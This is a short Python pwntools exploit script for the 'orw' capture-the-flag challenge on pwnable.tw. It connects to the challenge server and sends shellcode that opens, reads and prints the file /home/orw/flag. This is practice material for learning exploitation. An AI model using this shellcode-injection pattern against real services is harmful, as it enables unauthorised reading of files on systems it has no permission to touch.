from pwn import*
p = process('./orw')
p = remote('chall.pwnable.tw',10001)

# /home/orw/flag

### Gadget
bss_addr = 0x0804A060
path = '/home/orw/flag'

### Exploit
context(os='linux', arch='i386')

shellcode = ''
shellcode += asm(shellcraft.open("/home/orw/flag"))
shellcode += asm(shellcraft.read("eax","esp",0x100))
shellcode += asm(shellcraft.write(1,"esp",0x100))

p.send(shellcode)

p.interactive()
